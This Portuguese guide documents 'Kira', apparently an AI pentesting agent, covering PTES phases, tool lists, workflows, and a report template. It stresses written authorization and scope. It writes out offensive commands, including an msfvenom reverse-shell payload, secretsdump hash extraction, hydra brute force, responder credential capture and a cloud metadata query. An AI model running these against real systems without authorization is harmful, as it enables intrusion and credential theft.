# Guia Completo do Agente Kira (Cybersecurity)

[English](../en/CYBERSEC.md) | **Portugues**

---

## Indice

1. [Visao Geral](#visao-geral)
2. [Persona e Etica](#persona-e-etica)
3. [Metodologia PTES](#metodologia-ptes)
4. [Ferramentas Disponiveis](#ferramentas-disponiveis)
5. [Fluxos de Trabalho](#fluxos-de-trabalho)
6. [Exemplos Praticos](#exemplos-praticos)
7. [Formato de Relatorio](#formato-de-relatorio)
8. [Limitacoes e Cuidados](#limitacoes-e-cuidados)
9. [Integracao com MCPs](#integracao-com-mcps)
10. [Reference Rapida](#reference-rapida)

---

## Visao Geral

O **Kira** e o agente de seguranca cibernetica do AIOX OpenCode Adapter. Ele executa pentestings completos, escaneamento de vulnerabilidades, auditoria de seguranca e analise de ameacas seguindo metodologias reconhecidas pela industria.

### Capacidades

| Area | Nivel | Descricao |
|------|-------|-----------|
| Reconhecimento | Expert | Coleta de informacoes passiva e ativa |
| Web App Pentest | Expert | Testes em aplicacoes web |
| Network Pentest | Expert | Testes em infraestrutura de rede |
| Exploracao | Expert | Exploracao de vulnerabilidades |
| Post-Exploracao | Avançado | Apos exploracao e pivoting |
| Active Directory | Intermediario | Testes em ambientes AD |
| Cloud Security | Intermediario | Testes em AWS/Azure/GCP |
| Relatorios | Expert | Documentacao completa com CVSS |

### Versao Atual

- **Agente:** Kira (Cybersecurity Analyst)
- **Versao:** 3.0.0
- **Modo:** primary
- **Cor:** #ff0000

---

## Persona e Etica

### Persona

Kira e um profissional de pentesting e analise de seguranca. Ela segue rigorosamente:

1. **Autorizacao sempre primeiro** - Nunca testa sem autorizacao explicita
2. **Escopo definido** - Respeita os limites autorizados
3. **Documentacao completa** - Registra tudo para o relatorio
4. **Conduta profissional** - Segue praticas de divulgacao responsavel
5. **Conformidade legal** - Cumpre leis locais e internacionais

### Principios Eticos

```
1. NUNCA testar sem autorizacao written explicita
2. Respeitar o escopo autorizado
3. NAO modificar arquivos sem permissao
4. NAO executar exploits sem aprovacao
5. Documentar todos os achados
6. Fornecer recomendacoes de remediacao
7. Seguir responsavel disclosure
```

---

## Metodologia PTES

O Kira segue o **Penetration Testing Execution Standard (PTES)**:

### Fase 1: Reconhecimento (Passivo)

**Objetivo:** Coletar informacoes sem tocar no alvo.

**Ferramentas:**
- `subfinder` - Enumeracao de subdominios
- `amass` - Enumeracao avancada
- `gau` - URLs historicas
- `waybackurls` - URLs do Wayback Machine
- `theharvester` - Coleta de emails e subdominios
- `recon-ng` - Framework de reconhecimento
- `shodan` - Busca em dispositivos conectados
- `censys` - Analise de certificados e hosts

**Exemplo:**
```bash
# Enumerar subdominios
subfinder -d example.com -o subdominios.txt

# Coletar URLs historicas
gau example.com -o urls.txt

# Buscar informacoes em dispositivos
shodan search "org:Example ssl.cert.subject.CN:example.com"
```

### Fase 2: Escaneamento (Ativo)

**Objetivo:** Mapear hosts ativos, portas abertas, servicos e tecnologias.

**Ferramentas:**
- `nmap` - Escaneamento de portas e servicos
- `masscan` - Escaneamento de alta velocidade
- `rustscan` - Escaneamento rapido com Rust
- `httpx` - Deteccao de tecnologias web
- `whatweb` - Fingerprinting web
- `wafw00f` - Deteccao de WAF

**Exemplo:**
```bash
# Escaneamento basico
nmap -sV -sC example.com

# Escaneamento rapido
masscan 192.168.1.0/24 -p 80,443,8080 --rate=1000

# Deteccao de tecnologias
httpx -target example.com -tech-detect
```

### Fase 3: Enumeracao

**Objetivo:** Encontrar caminhos ocultos, parametros e vulnerabilidades.

**Ferramentas:**
- `ffuf` - Fuzzing de diretorios
- `dirb` - Enumeracao de diretorios
- `dirsearch` - Busca avancada
- `gobuster` - Enumeracao em paralelo
- `nikto` - Escaneamento de vulnerabilidades web
- `nuclei` - Escaneamento baseado em templates
- `arjun` - Descoberta de parametros
- `paramspider` - Mineracao de parametros

**Exemplo:**
```bash
# Enumerar diretorios
ffuf -u https://example.com/FUZZ -w wordlist.txt

# Escaneamento de vulnerabilidades
nuclei -target example.com -severity critical,high
```

### Fase 4: Analise de Vulnerabilidades

**Objetivo:** Identificar e validar vulnerabilidades.

**Ferramentas:**
- `nuclei` - Templates de vulnerabilidades
- `sqlmap` - Injecao SQL
- `dalfox` - XSS
- `nikto` - Vulnerabilidades web
- `burpsuite` - Analise manual
- `wpscan` - Vulnerabilidades WordPress
- `droopescan` - Vulnerabilidades Drupal

**Exemplo:**
```bash
# Teste de SQL Injection
sqlmap -u "https://example.com/page?id=1" --batch

# Teste de XSS
dalfox url "https://example.com/search?q=test"
```

### Fase 5: Exploracao (com autorizacao)

**Objetivo:** Confirmar vulnerabilidades com exploracao segura.

**Ferramentas:**
- `msfconsole` - Metasploit Framework
- `msfvenom` - Geracao de payloads
- `sqlmap` - Exploracao SQL injection
- `hydra` - Brute force
- `searchsploit` - Busca de exploits

**Exemplo:**
```bash
# Brute force de login
hydra -l admin -P wordlist.txt example.com http-post-form

# Gerar payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe
```

### Fase 6: Pos-Exploracao

**Objetivo:** Avaliar impacto, fazer pivot para outros sistemas.

**Ferramentas:**
- `impacket-scripts` - Suite completa para Windows
- `evil-winrm` - Acesso remoto Windows
- `chisel` - Tunneling
- `ligolo-ng` - Pivoting
- `linpeas` - Escalacao de privilegios Linux
- `winpeas` - Escalacao de privilegios Windows

**Exemplo:**
```bash
# Extrair hashes
secretsdump.py administrator:password@192.168.1.100

# Acesso remoto
evil-winrm -i 192.168.1.100 -u admin -p password
```

### Fase 7: Active Directory (se aplicavel)

**Objetivo:** Mapear ambiente AD, extrair credenciais, escalar para domain admin.

**Ferramentas:**
- `bloodhound-python` - Mapeamento de AD
- `ldapdomaindump` - Enumeracao LDAP
- `kerbrute` - Testes Kerberos
- `impacket` - Ataques AD
- `responder` - Coleta de credenciais

**Exemplo:**
```bash
# Mapear AD
bloodhound-python -d example.com -u user -p password -ns 192.168.1.1

# Kerberoasting
impacket-GetNPUsers example.com/ -usersfile users.txt -format hashcat
```

### Fase 8: Cloud Security (se aplicavel)

**Objetivo:** Avaliar configuracao cloud, encontrar misconfigurations.

**Ferramentas:**
- `pacu` - AWS exploitation
- `scout-suite` - Multi-cloud assessment
- `prowler` - AWS security
- `roadtools` - Azure security
- `trivy` - Scanner de containers
- `kube-hunter` - Kubernetes security

**Exemplo:**
```bash
# Enumerar recursos AWS
pacu --module iam__enum_users --force

# Escanear container
trivy image myapp:latest
```

### Fase 9: Relatorio

**Objetivo:** Documentar todos os achados com CVSS scores e recomendacoes.

**Formato:** Ver secao [Formato de Relatorio](#formato-de-relatorio)

---

## Ferramentas Disponiveis

### MCPs (quando disponiveis)

| MCP | Ferramentas | Descricao |
|-----|-------------|-----------|
| **HexStrike AI** | `hexstrike_*` | 100+ ferramentas de pentest |
| **Pentest MCP** | `pentest-mcp_*` | Ferramentas adicionais |

### CLI Tools (sempre disponiveis)

#### Reconhecimento

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `subfinder` | Subdominios | Enumeracao passiva |
| `amass` | Subdominios | Enumeracao avancada |
| `gau` | URLs | URLs historicas |
| `waybackurls` | URLs | Wayback Machine |
| `theharvester` | OSINT | Emails e subdominios |
| `recon-ng` | Framework | Framework completo |
| `shodan` | API | Dispositivos conectados |
| `censys` | API | Certificados e hosts |
| `dnsrecon` | DNS | Enumeracao DNS |
| `fierce` | DNS | DNS recon |
| `dnsenum` | DNS | Enumeracao DNS |
| `sublist3r` | Subdominios | Subdominios via search |

#### Web Application

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `ffuf` | Fuzzing | Fuzzing de diretorios |
| `dirb` | Enumeracao | Diretorios e arquivos |
| `dirsearch` | Enumeracao | Busca avancada |
| `gobuster` | Enumeracao | Enumeracao paralela |
| `nikto` | Vulnerabilidades | Web vulnerabilities |
| `nuclei` | Vulnerabilidades | Templates |
| `sqlmap` | Injecao | SQL injection |
| `dalfox` | Injecao | XSS |
| `commix` | Injecao | Command injection |
| `arjun` | Parametros | Descoberta de parametros |
| `paramspider` | Parametros | Mineracao |
| `jwt_tool` | JWT | Analise de tokens |
| `kiterunner` | API | Enumeracao de APIs |
| `gopherus` | SSRF | Geracao de payloads |
| `sstimap` | SSTI | Template injection |
| `wpscan` | CMS | WordPress |
| `droopescan` | CMS | Drupal |
| `cmseek` | CMS | Joomla |

#### Network Pentesting

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `nmap` | Escaneamento | Portas e servicos |
| `masscan` | Escaneamento | Alta velocidade |
| `rustscan` | Escaneamento | Rapido com Rust |
| `hydra` | Brute Force | Login brute force |
| `medusa` | Brute Force | Paralelo |
| `bettercap` | MITM | Man-in-the-Middle |
| `mitmproxy` | MITM | Proxy intercept |
| `responder` | Auth | Coleta de credenciais |
| `ntlmrelayx` | Relay | NTLM relay |
| `tcpdump` | Sniffing | Captura de pacotes |
| `tshark` | Sniffing | Wireshark CLI |
| `ngrep` | Sniffing | Grep em pacotes |
| `hping3` | Packets | Pacotes customizados |
| `nping` | Packets | Network probing |
| `enum4linux` | SMB | Enumeracao SMB |
| `smbclient` | SMB | Acesso a shares |
| `rpcclient` | RPC | Enumeracao RPC |

#### Exploracao

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `msfconsole` | Framework | Metasploit |
| `msfvenom` | Payloads | Geracao de payloads |
| `searchsploit` | Exploit DB | Busca de exploits |
| `ropper` | ROP | ROP gadgets |
| `one_gadget` | Gadgets | One-shot RCE |
| `pwntools` | Framework | Exploit development |
| `veil` | Evasion | Evacao de antivirus |
| `shellter` | Injection | Shell injection |
| `unicorn` | Payloads | Payloads |

#### Pos-Exploracao

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `impacket-*` | Suite | Windows attacks |
| `secretsdump` | Dump | Hash extraction |
| `psexec` | Exec | Remote execution |
| `wmiexec` | Exec | WMI execution |
| `smbexec` | Exec | SMB execution |
| `evil-winrm` | Windows | Remote management |
| `chisel` | Tunneling | HTTP tunnel |
| `ligolo-ng` | Pivoting | Network pivot |
| `linpeas` | Privesc | Linux privilege escalation |
| `linenum` | Enum | Linux enumeration |
| `linux-exploit-suggester` | Suggester | Linux exploits |
| `winpeas` | Privesc | Windows privilege escalation |
| `powerup` | Privesc | PowerShell privesc |
| `jaws` | Privesc | Just Another Windows (Enum) |
| `sherlock` | Username | Social media username hunt |

#### Active Directory

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `bloodhound-python` | Enumeration | AD graph |
| `ldapdomaindump` | LDAP | LDAP dump |
| `kerbrute` | Kerberos | Kerberos brute force |
| `responder` | Auth | Credential harvesting |
| `ntlmrelayx` | Relay | NTLM relay |

#### Cloud Security

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `pacu` | AWS | AWS exploitation |
| `scout-suite` | Multi-cloud | Cloud assessment |
| `prowler` | AWS | AWS security |
| `roadtools` | Azure | Azure security |
| `trivy` | Containers | Container scanning |
| `kube-hunter` | Kubernetes | K8s security |

#### Reverse Engineering

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `gdb` | Debugging | GNU Debugger |
| `python3` | Scripting | Python scripts |
| `strings` | Analysis | String extraction |
| `xxd` | Hex | Hex dump |
| `hexdump` | Hex | Hex dump |
| `readelf` | ELF | ELF analysis |
| `objdump` | Disasm | Disassembly |
| `nm` | Symbols | Symbol table |
| `ldd` | Libraries | Library dependencies |
| `strace` | Trace | System call trace |
| `ltrace` | Trace | Library call trace |

#### Sistema

| Ferramenta | Tipo | Descricao |
|------------|------|-----------|
| `cat` | File | Ler arquivos |
| `ls` | Directory | Listar diretorios |
| `pwd` | Path | Diretorio atual |
| `id` | User | Usuario atual |
| `whoami` | User | Nome do usuario |
| `uname` | System | Info do sistema |
| `ifconfig` | Network | Interfaces |
| `ip` | Network | Interfaces (moderno) |
| `netstat` | Network | Conexoes |
| `ss` | Network | Conexoes (moderno) |
| `ps` | Process | Processos |
| `top` | Process | Top processos |
| `find` | Search | Busca de arquivos |
| `locate` | Search | Busca indexada |
| `which` | Search | Localizar comandos |
| `file` | Analysis | Tipo de arquivo |

---

## Fluxos de Trabalho

### Fluxo 1: Avaliacao Rapida

```
1. Reconhecimento rapido
   → subfinder -d target.com
   → httpx -target target.com

2. Escaneamento
   → nmap -sV -sC target.com
   → nuclei -target target.com

3. Relatorio basico
   → Lista de vulnerabilidades encontradas
```

### Fluxo 2: Pentest Completo

```
1. Reconhecimento passivo
   → subfinder, gau, waybackurls, theharvester

2. Escaneamento ativo
   → nmap, masscan, httpx, whatweb, wafw00f

3. Enumeracao
   → ffuf, dirsearch, nikto, nuclei

4. Analise de vulnerabilidades
   → nuclei, sqlmap, dalfox, nikto

5. Exploracao (com autorizacao)
   → msfconsole, hydra, sqlmap

6. Pos-exploracao
   → impacket, evil-winrm, chisel

7. Relatorio
   → Documentacao completa com CVSS
```

### Fluxo 3: Pentest Web App

```
1. Spider/crawl
   → katana, hakrawler

2. Enumeracao de diretorios
   → ffuf, gobuster, dirsearch

3. Testes de injecao
   → sqlmap, dalfox, commix

4. Teste manual
   → Burp Suite Community

5. Escaneamento automatizado
   → OWASP ZAP

6. Relatorio
   → Detalhado com evidencias
```

### Fluxo 4: Pentest de Rede

```
1. Descoberta de hosts
   → nmap, masscan

2. Enumeracao de servicos
   → nmap scripts

3. Teste de vulnerabilidades
   → nuclei

4. Brute force
   → hydra, medusa

5. Teste de misconfigurations
   → enum4linux, smbclient

6. Relatorio
   → Completo com evidencias
```

### Fluxo 5: Pentest Active Directory

```
1. Enumeracao de usuarios
   → kerbrute, ldapdomaindump

2. Mapeamento de AD
   → bloodhound-python

3. Testes Kerberos
   → impacket (GetNPUsers, GetUserSPNs)

4. Coleta de credenciais
   → responder, ntlmrelayx

5. Escalacao de privilegios
   → impacket (secretsdump)

6. Relatorio
   → Detalhado com caminhos de ataque
```

### Fluxo 6: Cloud Security

```
1. Enumeracao de recursos
   → pacu, roadtools

2. Verificacao de misconfigurations
   → scout-suite, prowler

3. Escaneamento de containers
   → trivy, kube-hunter

4. Teste de metadata attacks
   → curl http://169.254.169.254/latest/meta-data/

5. Relatorio
   → Configuracoes inseguras encontradas
```

---

## Exemplos Praticos

### Exemplo 1: Pentest Basico

```
Usuario: @cybersec Faca um pentest basico no site exemplo.com

Kira executa:

1. Confirma autorizacao
   → "Voce tem autorizacao para testar exemplo.com?"

2. Reconhecimento
   → subfinder -d exemplo.com
   → httpx -target exemplo.com

3. Escaneamento
   → nmap -sV -sC exemplo.com
   → nuclei -target exemplo.com

4. Enumeracao
   → ffuf -u https://exemplo.com/FUZZ -w wordlist.txt

5. Relatorio
   → 8 vulnerabilidades encontradas
   → 1 critica, 3 altas, 4 medias
   → Recomendacoes de remediacao
```

### Exemplo 2: Pentest Web App Completo

```
Usuario: @cybersec Faca um pentest completo na aplicacao web app.exemplo.com

Kira executa:

1. Confirmacao de autorizacao
   → Verifica escopo e restricoes

2. Reconhecimento passivo
   → subfinder -d app.exemplo.com
   → gau app.exemplo.com
   → theharvester -d app.exemplo.com -b google

3. Escaneamento ativo
   → nmap -sV -sC app.exemplo.com
   → whatweb app.exemplo.com
   → wafw00f app.exemplo.com

4. Enumeracao
   → katana -u https://app.exemplo.com -d 3
   → ffuf -u https://app.exemplo.com/FUZZ -w common.txt
   → arjun -u https://app.exemplo.com/page

5. Testes de injecao
   → sqlmap -u "https://app.exemplo.com/page?id=1" --batch
   → dalfox url "https://app.exemplo.com/search?q=test"
   → commix -u "https://app.exemplo.com/cmd?input=test"

6. Analise manual
   → Burp Suite: Intercept e repeater
   → ZAP: Escaneamento automatizado

7. Relatorio detalhado
   → 23 vulnerabilidades encontradas
   → 2 criticas, 7 altas, 10 medias, 4 baixas
   → Evidencias para cada achado
   → Passo-a-passo de reproducao
   → Recomendacoes especificas
```

### Exemplo 3: Pentest de Rede

```
Usuario: @cybersec Faca um pentest na rede 192.168.1.0/24

Kira executa:

1. Confirmacao
   → Verifica autorizacao para a rede

2. Descoberta de hosts
   → nmap -sn 192.168.1.0/24
   → Resultado: 15 hosts ativos

3. Escaneamento de portas
   → nmap -sV -sC 192.168.1.0/24
   → Resultado: 45 portas abertas

4. Enumeracao de servicos
   → enum4linux 192.168.1.100
   → smbclient -L //192.168.1.100

5. Testes de vulnerabilidades
   → nuclei -l hosts.txt
   → hydra -L users.txt -P pass.txt 192.168.1.100 ssh

6. Relatorio
   → Mapa de rede completo
   → Servicos identificados
   → Vulnerabilidades encontradas
   → Credenciais obtidas (se houver)
```

---

## Formato de Relatorio

### Estrutura do Relatorio

```markdown
# Relatorio de Pentest - [Target]

## Resumo Executivo
- Alvo testado
- Escopo do teste
- Periodo de execucao
- Nivel geral de risco
- Principais achados

## Detalhes Tecnicos

### Vulnerabilidades Encontradas

#### [CVSS 9.0-10.0] Criticas
- **Vulnerabilidade:** [Nome]
- **CVSS:** [Score]
- **Vetor:** [Complexidade, Privilegio, Interacao]
- **Descricao:** [Descricao detalhada]
- **Evidencia:** [Comando, Screenshot, Output]
- **Reproducao:** [Passo-a-passos]
- **Remediacao:** [Como corrigir]

#### [CVSS 7.0-8.9] Altas
...

#### [CVSS 4.0-6.9] Medias
...

#### [CVSS 0.1-3.9] Baixas
...

### Recomendacoes Gerais
1. [Recomendacao 1]
2. [Recomendacao 2]
3. [Recomendacao 3]

### Anexos
- Output das ferramentas
- Dados brutos
- Referencias
```

### Classificacao CVSS

| Faixa | Severidade | Cor |
|-------|------------|-----|
| 9.0 - 10.0 | Critica | Vermelho |
| 7.0 - 8.9 | Alta | Laranja |
| 4.0 - 6.9 | Media | Amarelo |
| 0.1 - 3.9 | Baixa | Verde |

---

## Limitacoes e Cuidados

### Autorizacao

```
CRITICO: NUNCA testar sem autorizacao written explicita.

Antes de qualquer teste:
1. Obter autorizacao written do proprietario do alvo
2. Definir escopo do teste
3. Definir horarios permitidos
4. Definir restricoes (nao derrubar servicos, etc.)
5. Ter contato de emergencia
```

### Escopo

```
Sempre verificar:
1. Quais IPs/dominios estao no escopo
2. Quais portas/servicos podem ser testados
3. Quais tecnicas sao permitidas
4. Quais sao as restricoes
5. Qual o processo de divulgacao
```

### Cuidados

```
1. NAO derrubar servicos em producao
2. NAO executar exploits destrutivos
3. NAO modificar dados sem autorizacao
4. NAO acessar dados de terceiros
5. NAO fazer ataques de denegacao de servico
6. Manter logs de todas as acoes
7. Reportar imediatamente vulnerabilidades criticas
```

### Ferramentas Nao Instaladas

```
Se uma ferramenta nao estiver instalada:
1. Verificar se esta no PATH
2. Verificar se pode ser instalada
3. Usar alternativa disponivel
4. Documentar na falha
5. nao quebrar o fluxo de trabalho
```

---

## Integracao com MCPs

### HexStrike AI

```python
# Ferramentas hexstrike_*
hexstrike_nmap_scan(target, scan_type, ports)
hexstrike_nuclei_scan(target, severity, tags)
hexstrike_sqlmap_scan(url, data)
hexstrike_subfinder_scan(domain)
hexstrike_amass_scan(domain, mode)
hexstrike_hydra_attack(target, service, username, password_file)
```

### Pentest MCP

```python
# Ferramentas pentest-mcp_*
pentest-mcp_nmap_scan(target, scan_type, ports)
pentest-mcp_nikto_scan(target, port)
pentest-mcp_sqlmap_test(url, parameter)
pentest-mcp_hydra_brute(target, service, username, password)
pentest-mcp_subfinder_scan(domain)
```

### Uso com MCPs

```
1. Verificar se MCP esta disponivel
2. Usar ferramentas MCP como primarias
3. Usar CLI como alternativa
4. Documentar qual ferramenta foi usada
```

---

## Reference Rapida

### Comandos Comuns

```bash
# Reconhecimento
subfinder -d target.com -o subs.txt
gau target.com -o urls.txt
theharvester -d target.com -b google

# Escaneamento
nmap -sV -sC target.com
masscan 192.168.1.0/24 -p 80,443
httpx -target target.com -tech-detect

# Enumeracao
ffuf -u https://target.com/FUZZ -w wordlist.txt
nuclei -target target.com
nikto -h target.com

# Injecao
sqlmap -u "https://target.com/page?id=1" --batch
dalfox url "https://target.com/search?q=test"
commix -u "https://target.com/cmd?input=test"

# Brute Force
hydra -l admin -P wordlist.txt target.com http-post-form
medusa -h target.com -u admin -P wordlist.txt -M http

# Exploracao
msfconsole
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe
searchsploit apache 2.4

# Pos-Exploracao
secretsdump.py admin:pass@192.168.1.100
evil-winrm -i 192.168.1.100 -u admin -p pass
chisel server --reverse
linpeas.sh

# Active Directory
bloodhound-python -d target.com -u user -p pass -ns 192.168.1.1
responder -I eth0
impacket-GetNPUsers target.com/ -usersfile users.txt
```

### Fluxo Resumido

```
1. Autorizacao → 2. Recon → 3. Scan → 4. Enum → 
5. Vuln Analysis → 6. Exploit → 7. Post-Exploit → 
8. AD (se applicavel) → 9. Cloud (se applicavel) → 
10. Relatorio
```

---

## Proximos Passos

1. [Guia dos Agentes](AGENTS.md)
2. [Solucao de Problemas](TROUBLESHOOTING.md)
3. [Guia dos MCPs](MCP-GUIDE.md)
